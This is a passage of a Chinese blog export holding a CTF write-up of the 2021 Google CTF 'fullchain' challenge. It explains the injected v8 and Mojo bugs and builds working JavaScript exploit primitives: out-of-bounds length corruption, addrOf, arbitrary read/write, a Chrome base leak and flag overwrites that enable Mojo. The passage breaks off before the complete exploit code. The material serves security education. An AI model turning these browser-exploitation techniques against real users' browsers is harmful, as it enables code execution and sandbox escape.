<span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://blog.bi0s.in/2021/08/15/Pwn/InCTFi21-DeadlyFastGraph/">https://blog.bi0s.in/2021/08/15/Pwn/InCTFi21-DeadlyFastGraph/</a></li>
<li><a href="https://www.anquanke.com/post/id/251597">https://www.anquanke.com/post/id/251597</a></li>
<li><a href="http://phrack.org/papers/attacking_javascript_engines.html">http://phrack.org/papers/attacking_javascript_engines.html</a></li>
<li><a href="https://liveoverflow.com/the-butterfly-of-jsobject-browser-0x02/">https://liveoverflow.com/the-butterfly-of-jsobject-browser-0x02/</a></li>
</ul>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>browser</tag>
        <tag>jsc</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>2021-google-ctf-pwn-fullchain</title>
    <url>/68622871/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>2021 google ctf 一道 pwn 题的复现，正如题目的名字，这是一条利用链，从 v8 到 sandbox-escape 再到 kernel pwn 提权</p>
<span id="more"></span>

<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>官方附件：</p>
<p><code>https://storage.googleapis.com/gctf-2021-attachments-project/c12856fc6c010d643763e678265f7921b7a44dcd7bcb5ced32634d21dfdff0c5f9542d6a5bdcc6639d8834ab1ff25b263affd8952b11e972c2066aa3cae71540</code></p>
<p>官方题目源码：<code>https://github.com/google/google-ctf/tree/master/2021/quals/pwn-fullchain</code><br>(<em>环境很大，要搭建很久</em>)</p>
<p>远程环境：<code>fullchain.2021.ctfcompetition.com 1337</code></p>
<p>chromium 的 commit 为：<code>1be58e78c7ec6603d416aed4dfae757334cd4e1e</code></p>
<p>为了方便地调试 v8 的漏洞，需要搭建一下 v8 的环境，可以在下面的链接找到对应的 v8 commit ：<a href="https://chromium.googlesource.com/chromium/src/+/1be58e78c7ec6603d416aed4dfae757334cd4e1e/DEPS">https://chromium.googlesource.com/chromium/src/+/1be58e78c7ec6603d416aed4dfae757334cd4e1e/DEPS</a></p>
<p>找到到 <code>v8_revision</code> 字段，得到 commit</p>
<pre class="line-numbers language-none"><code class="language-none">...
  &#39;v8_revision&#39;: &#39;0cf641358acebb26c2b7ddc047b1b41597d344c8&#39;,
...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>搭建 v8 的调试环境即可</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>题目要求输入一个 html 文件，交给 chrome 解析，flag 在 <code>/dev/vdb</code> 里，并且要 root 权限</p>
<p>那么要从 chrome 任意代码执行，然后 kernel pwn 提权了</p>
<h3 id="从-chrome-到任意代码执行"><a href="#从-chrome-到任意代码执行" class="headerlink" title="从 chrome 到任意代码执行"></a>从 chrome 到任意代码执行</h3><p>先来看看 chrome，题目用两个 patch 构造了两个 bug，分别对应 v8 和 Mojo</p>
<p>v8_bug.patch：</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">diff --git a&#x2F;src&#x2F;builtins&#x2F;typed-array-set.tq b&#x2F;src&#x2F;builtins&#x2F;typed-array-set.tq
index b5c9dcb261..ac5ebe9913 100644
--- a&#x2F;src&#x2F;builtins&#x2F;typed-array-set.tq
+++ b&#x2F;src&#x2F;builtins&#x2F;typed-array-set.tq
@@ -198,7 +198,7 @@ TypedArrayPrototypeSetTypedArray(implicit context: Context, receiver: JSAny)(
   if (targetOffsetOverflowed) goto IfOffsetOutOfBounds;
 
   &#x2F;&#x2F; 9. Let targetLength be target.[[ArrayLength]].
-  const targetLength &#x3D; target.length;
+  &#x2F;&#x2F; const targetLength &#x3D; target.length;
 
   &#x2F;&#x2F; 19. Let srcLength be typedArray.[[ArrayLength]].
   const srcLength: uintptr &#x3D; typedArray.length;
@@ -207,8 +207,8 @@ TypedArrayPrototypeSetTypedArray(implicit context: Context, receiver: JSAny)(
 
   &#x2F;&#x2F; 21. If srcLength + targetOffset &gt; targetLength, throw a RangeError
   &#x2F;&#x2F;   exception.
-  CheckIntegerIndexAdditionOverflow(srcLength, targetOffset, targetLength)
-      otherwise IfOffsetOutOfBounds;
+  &#x2F;&#x2F; CheckIntegerIndexAdditionOverflow(srcLength, targetOffset, targetLength)
+  &#x2F;&#x2F;     otherwise IfOffsetOutOfBounds;
 
   &#x2F;&#x2F; 12. Let targetName be the String value of target.[[TypedArrayName]].
   &#x2F;&#x2F; 13. Let targetType be the Element Type value in Table 62 for
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这个 patch 很简单，把 TypedArray 的 set 方法的边界检查给去掉了</p>
<p>set 方法是从指定索引开始给数组填充数据，没有了边界检查，那么就可以越界写了</p>
<p>从越界写构造任意读写，那么就可以做很多事情了，当然了执行 shellcode 拿 shell 是不行的，因为 chrome 开启了 sandbox，v8 引擎的进程运行在 sandbox 中，很多系统调用如 execve 都无法使用，想要拿到 shell，就要利用接下来的 Mojo 的漏洞进行 sandbox-escape 了</p>
<p>来看看 Mojo 的 bug，在文件 sbx_bug.patch 中，patch 给 Mojo 添加了一个 interface，有 ResizeVector，Read，Write 方法如下：</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void CtfInterfaceImpl::ResizeVector(uint32_t size,
                                    ResizeVectorCallback callback) &#123;
  numbers_.resize(size);
  std::move(callback).Run();
&#125;

void CtfInterfaceImpl::Read(uint32_t offset, ReadCallback callback) &#123;
  std::move(callback).Run(numbers_[offset]);
&#125;

void CtfInterfaceImpl::Write(double value,
                             uint32_t offset,
                             WriteCallback callback) &#123;
  numbers_[offset] &#x3D; value;
  std::move(callback).Run();
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>其中 numbers_ 成员是 std::vector 类，可以看到 Read 和 Write 方法都没有对索引进行越界检查，而且 std::vector 类对运算符 <code>[]</code> 的重载中，也是没有边界检查的，所以 Read 和 Write 可以任意越界读写，且 Mojo 的进程是不在 sandbox 里的，利用任意越界读写可以在 Mojo 的进程里执行 shellcode 就能拿到 shell</p>
<h4 id="v8-exploit"><a href="#v8-exploit" class="headerlink" title="v8 exploit"></a>v8 exploit</h4><p>默认情况下，chrome 是不开启 Mojo 的功能的，需要添加相应的启动参数，但是 chrome 是有一些全局的 flags 控制运行时开启某些功能，开启 Mojo 的 flag 是 <code>is_mojo_js_enabled</code> 和 <code>is_mojo_js_test_enabled</code>，这两个是布尔类型的变量，通过 v8 的漏洞，将这两个变量改写为 true，重新加载页面即可开启 Mojo</p>
<h5 id="从越界写到越界读写"><a href="#从越界写到越界读写" class="headerlink" title="从越界写到越界读写"></a>从越界写到越界读写</h5><p>调试以下代码：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint32Array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint32Array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> oob_arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1.1</span><span class="token punctuation">,</span> <span class="token number">1.2</span><span class="token punctuation">,</span> <span class="token number">1.3</span><span class="token punctuation">,</span> <span class="token number">1.4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>oob_arr<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以看到数组 b 的 data_ptr 即数组的起始地址：<br><img src="/images/68622871/0.png" alt="data_ptr"></p>
<p>以及数组 oob_arr 的信息：<br><img src="/images/68622871/1.png" alt="oob_arr"></p>
<p>oob_arr 的长度为 4，因为 smi 用最低 bit 为 0 标记，那么 length 在内存中的值为 8，可以看到在如下地址处：<br><img src="/images/68622871/2.png" alt="length"></p>
<p>那么越界改写 oob_arr 的 length 字段，即可利用 oob_arr 造成任意越界读写，计算偏移如下：<br><img src="/images/68622871/3.png" alt="offset_overwrite_length"></p>
<p>那么只要 <code>b.set([fake_length], 32)</code>，即可达到改写 oob_arr 的 length 字段了，后续代码如下：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js">a<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">444444</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
b<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>可以看到 length 字段成功被改写：<br><img src="/images/68622871/4.png" alt="oob"></p>
<h5 id="addrOf"><a href="#addrOf" class="headerlink" title="addrOf"></a>addrOf</h5><p>泄露地址的方式很简单，构造 Float 和 Object 的类型混淆就行，通过 Object 数组放入对象，再利用 oob_arr 越界把对象当作浮点数（也就是对象的地址）读出来即可：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint32Array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint32Array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> oob_arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1.1</span><span class="token punctuation">,</span> <span class="token number">1.2</span><span class="token punctuation">,</span> <span class="token number">1.3</span><span class="token punctuation">,</span> <span class="token number">1.4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> obj_faker <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>oob_arr<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>obj_faker<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>调试看到 obj_faker 和 oob_arr 的信息：<br><img src="/images/68622871/5.png" alt="obj_faker"></p>
<p><img src="/images/68622871/7.png" alt="oob_arr"></p>
<p>计算偏移：<br><img src="/images/68622871/8.png" alt="offset_addrOf"></p>
<p><strong>注意：</strong> 因为 FixedDoubleArray 每个元素的大小是 8 字节，所以计算索引的时候是除以 8，而 FixedArray 每个元素都是对象的指针或者 smi （小整数），而且是 pointer compress （即指针压缩）的，占用 4 字节，所以 leak 出来的低 4 字节才是对象地址（压缩后的）</p>
<p>根据偏移可以编写 addrOf 函数了：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">addrOf</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    obj_faker<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> obj<span class="token punctuation">;</span>
    <span class="token keyword">return</span> oob_arr<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">f2i</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xfffffffn</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>为了方便浮点数和整数的转换还添加了下面的代码：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> conversion_buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> float_view <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Float64Array</span><span class="token punctuation">(</span>conversion_buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> int_view <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigUint64Array</span><span class="token punctuation">(</span>conversion_buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">BigInt</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">hex</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token string">'0x'</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token class-name">BigInt</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">i2f</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    int_view<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> float_view<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token class-name">Number</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">f2i</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    float_view<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> int_view<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="AAR-AAW"><a href="#AAR-AAW" class="headerlink" title="AAR/AAW"></a>AAR/AAW</h5><p>大多数情况下，可以利用 oob_arr 的越界写，改写 ArrayBuffer 的 backing_store 指针，来进行任意地址读写</p>
<p>不过这里参照 Hatena 师傅的 wp <a href="#Hatena_wp">#Hatena_wp</a>，可以利用 TypedArray 类似的字段进行任意地址读写，先看看下面代码：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint32Array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint32Array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> oob_arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1.1</span><span class="token punctuation">,</span> <span class="token number">1.2</span><span class="token punctuation">,</span> <span class="token number">1.3</span><span class="token punctuation">,</span> <span class="token number">1.4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> obj_faker <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> float_arr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Float64Array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>oob_arr<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>obj_faker<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>float_arr<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以看到，data_ptr 由 base_pointer 和 external_pointer 组成：<br><img src="/images/68622871/9.png" alt="TypedArray_data_ptr"></p>
<p>可以发现 <strong>data_ptr = external_pointer + base_pointer</strong>，而且这个 external_pointer 含有完整指针的高 4 字节的地址，有了这个也可以得到对象的完整的 64 bit 的地址了<br><img src="/images/68622871/10.png" alt="data_ptr_mem"></p>
<p>同样地计算偏移后即可构造处任意地址读写：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> old_28 <span class="token operator">=</span> oob_arr<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// external_pointer</span>
<span class="token keyword">let</span> old_29 <span class="token operator">=</span> oob_arr<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// base_pointer</span>
<span class="token keyword">let</span> r13 <span class="token operator">=</span> old_28<span class="token punctuation">.</span><span class="token function">f2i</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffff00000000n</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'old_28 = '</span> <span class="token operator">+</span> old_28<span class="token punctuation">.</span><span class="token function">f2i</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'old_29 = '</span> <span class="token operator">+</span> old_29<span class="token punctuation">.</span><span class="token function">f2i</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">arb_read</span><span class="token punctuation">(</span><span class="token parameter">addr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    oob_arr<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>addr <span class="token operator">&amp;</span> <span class="token number">0xffffffff00000000n</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">7n</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">i2f</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    oob_arr<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>addr <span class="token operator">-</span> <span class="token number">8n</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">1n</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffffn</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">i2f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> float_arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">f2i</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">arb_write</span><span class="token punctuation">(</span><span class="token parameter">addr<span class="token punctuation">,</span> value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    oob_arr<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>addr <span class="token operator">&amp;</span> <span class="token number">0xffffffff00000000n</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">7n</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">i2f</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    oob_arr<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>addr <span class="token operator">-</span> <span class="token number">8n</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">1n</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffffn</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">i2f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    float_arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">.</span><span class="token function">i2f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<h5 id="Enable-Mojo"><a href="#Enable-Mojo" class="headerlink" title="Enable Mojo"></a>Enable Mojo</h5><p>有了任意地址读写和 leak 用的 addrOf，可以先泄露 chrome 的基地址</p>
<p>泄露 chrome 的基地址用到了 DOM 结点对象，这里使用 div ，在 +0xC 偏移处含有一个 chrome 段内的指针，计算可得 chrome 的地址：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> div <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'div'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> div_addr <span class="token operator">=</span> <span class="token function">addrOf</span><span class="token punctuation">(</span>div<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1n</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'div_addr = '</span> <span class="token operator">+</span> div_addr<span class="token punctuation">.</span><span class="token function">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">let</span> chrome_base <span class="token operator">=</span> <span class="token function">arb_read</span><span class="token punctuation">(</span>r13 <span class="token operator">|</span> <span class="token punctuation">(</span>div_addr <span class="token operator">+</span> <span class="token number">0xCn</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x000000000c1bb7c0n</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'chrome_base = '</span> <span class="token operator">+</span> chrome_base<span class="token punctuation">.</span><span class="token function">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>上面的偏移，只能先 leak 出来看看，然后查符号表看看低 12 bits 相同的有哪些一个个试了 </p>
<p>最后改写 <code>is_mojo_js_enabled</code> 和 <code>is_mojo_js_test_enabled</code> 为 true（非 0 值）刷新页面：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> is_mojo_js_enabled <span class="token operator">=</span> chrome_base <span class="token operator">+</span> <span class="token number">0x000000000c560f0en</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> is_mojo_js_test_enabled <span class="token operator">=</span> chrome_base <span class="token operator">+</span> <span class="token number">0x000000000c560f0fn</span><span class="token punctuation">;</span>


<span class="token comment">// enable mojo</span>
<span class="token function">arb_write</span><span class="token punctuation">(</span>is_mojo_js_enabled<span class="token punctuation">,</span> <span class="token number">1n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">arb_write</span><span class="token punctuation">(</span>is_mojo_js_test_enabled<span class="token punctuation">,</span> <span class="token number">1n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'mojo enable!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
window<span class="token punctuation">.</span>location<span class="token punctuation">.</span><span class="token function">reload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>偏移可以通过查符号表获得：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ nm --demangle chromium/chrome <span class="token operator">|</span> <span class="token function">grep</span> is_mojo
000000000c560f0e b blink::RuntimeEnabledFeaturesBase::is_mojo_js_enabled_
000000000c560f0f b blink::RuntimeEnabledFeaturesBase::is_mojo_js_test_enabled_<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>因为刷新页面后，这个页面的 js 对象就要回收了，因为我们改写了 TypedArray 的两个指针，可能会在释放内存的时候 crash，所以需要恢复这两个指针再刷新：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">cleanup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    oob_arr<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">=</span> old_28<span class="token punctuation">;</span>
    oob_arr<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">=</span> old_29<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">cleanup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
window<span class="token punctuation">.</span>location<span class="token punctuation">.</span><span class="token function">reload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><em>实际上好像并不会 crash，应该和环境有关</em></p>
<hr>
<p>至此，完整的代码如下：</p>
